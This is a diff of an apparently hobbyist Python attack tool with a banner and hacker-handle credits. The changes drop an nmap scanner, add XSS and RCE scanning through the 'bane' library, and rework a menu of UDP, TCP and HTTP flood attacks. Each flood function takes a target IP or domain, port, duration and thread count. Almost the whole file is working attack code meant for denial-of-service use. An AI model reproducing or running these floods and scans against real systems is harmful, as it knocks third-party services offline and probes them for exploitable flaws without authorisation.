@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# Tested only on linux systems - buggy on some windows sadly #
+# Tested only on linux systems and termux - buggy on windows 7 sadly #
 # Twitter : @YourAnonS0u1 #
 # Bane - credits to Ala #
 # Special thanks to c0stablf #
@@ -10,9 +10,6 @@
 # Requirements #                                                      #
 #--------------#                                                      #
 #                                                                     #
-# pip3 install nmap                                                   #
-import nmap                                                           #
-sc = nmap.PortScanner()                                               #
 # pip3 install bane                                                   #
 import bane                                                           #
 #                                                                     #
@@ -30,6 +27,10 @@ import os                                                             #
 
 #----------------#
 
+import sys
+if  sys.version_info < (3,0):
+    input=raw_input
+
 print("""
 .d8888. d8b   db db    db d88888b d88888b 
 88'  YP 888o  88 88    88 88'     88'     
@@ -43,96 +44,90 @@ db   8D 88  V888 88b  d88 88      88
 
 #----------------#
 def main():
-  n = input("1 - Network Scanner \ n2 - Vulnerability Detection \ n3 - Denial of Service Tool \ nSelect a number from 1 to 3:")
+  print("1 - Vulnerability Detection \n[2 - Denial of Service Tool \n[Select a number from 1 to 2:")
+  n = int(input())
 
 
-  if n == '1':
-    nmap()
-  if n == '2':
+  if n == 1:
     vuln()
-  if n == '3':
+  elif n == 2:
     flood()
-
   else:
     print("Please enter a valid number.")
 
-def nmap():
-  os.system("clear || cls")
-  print("#-------------------- welcome to network scanner --------------------#")
-  target = input("\nEnter the IP address of the destination: ")  
-  sc.scan(target, '1-65536')
-  print(sc.scaninfo())
-  print(sc[target]['tcp'].keys())
 
 def vuln():
   os.system("clear || cls")
   print("#-------------------- welcome to vulnerability scan --------------------#")
-  url = input("\nenter target IP address: ")  
-  print(os.system('nmap -sV --script=vulnscan.nse' +ip))
+  url = input("Enter target URL: ")  
+  print("[*] Doing XSS scan :")
+  bane.xss(url)
+  print("[*] Doing RCE scan :")
+  bane.rce(url)
 
 def flood():
   os.system("clear || cls")
   print("#-------------------- welcome to denial --------------------#")
-  u = input("4 - Udp Flood\n5 - Tcp Flood\n6 - Http Flood\nChoose a number between 4 and 6: ")
+  print("1 - Udp Flood\n2 - Tcp Flood\n3 - Http Flood\nChoose a number between 1 and 3: ")
+  u = int(input())
 
 
-  if u == '4':
+  if u == 1:
     udp()
-  if u == '5':
+  elif u == 2:
     tcp()
-  if u == '6':
+  elif u == 3:
     http()
-
   else:
     print("Please enter a valid number.")
 
 def udp():
   os.system("clear || cls")
   print("#-------------------- Udp Flood --------------------#")
-  ip = input("\nEnter IP Address: ")
-  port = input("\nPort: ")
-  time = input("\nTime: ")
+  ip = input("Enter IP Address: ")
+  port = int(input("Port: "))
+  time = int(input("Time: "))
   bane.udp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001)
 
 def tcp():
   os.system("clear || cls")
   print("#-------------------- Tcp Flood --------------------#")
-  ip = input("\nEnter IP Address: ")
-  port = input("\nPort: ")
-  time = input("\nTime: ")
-  thread = input("\nThreads: ")
+  ip = input("Enter IP Address: ")
+  port = int(input("Port: "))
+  time = int(input("Time: "))
+  thread = int(input("Threads: "))
   bane.tcp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001, threads=thread, timeout=5)
 
 def http():
   os.system("clear || cls")
   print("#-------------------- Http Flood --------------------#")
-  h = input("7 - Proxyless Http Flood\n8 - Basic Http Flood\nSelect a number from 1 to 2: ")
+  print("1 - Proxyless Http Flood\n2 - Basic Http Flood\nSelect a number from 1 to 2: ")
+  h = int(input())
 
-  if h == "7":
+  if h == 1:
     httproxy()
-  if h == "8":
+  elif h == 2:
     httpbasic()
   else:
     print("Please enter a valid number")
 def httproxy():
   os.system("clear || cls")
   print("#-------------------- Proxy Http Flood --------------------#")
-  ip = input("\nEnter IP/URL to attack: ")
-  port = input("\nPort: ")
-  time = input("\nTime: ")
-  thread = input("\nThreads: ")
-  bane.prox_http_flood(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)
+  ip = input("Enter IP/DOMAIN to attack: ")
+  port = int(input("Port: "))
+  time = int(input("Time: "))
+  thread = int(input("Threads: "))
+  bane.prox_http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)
 
 def httpbasic():
   os.system("clear || cls")
   print("#-------------------- Basic Http Flood --------------------#")
-  ip = input("\nEnter IP/URL to attack: ")
-  port = input("\nPort: ")
-  time = input("\nTime: ")
-  thread = input("\nThreads: ")
-  bane.http_flood(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)
+  ip = input("Enter IP/DOMAIN to attack: ")
+  port = int(input("Port: "))
+  time = int(input("Time: "))
+  thread = int(input("Threads: "))
+  bane.http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)
 
 #----------------#
 
-if name == "main":
-  main()
+main()
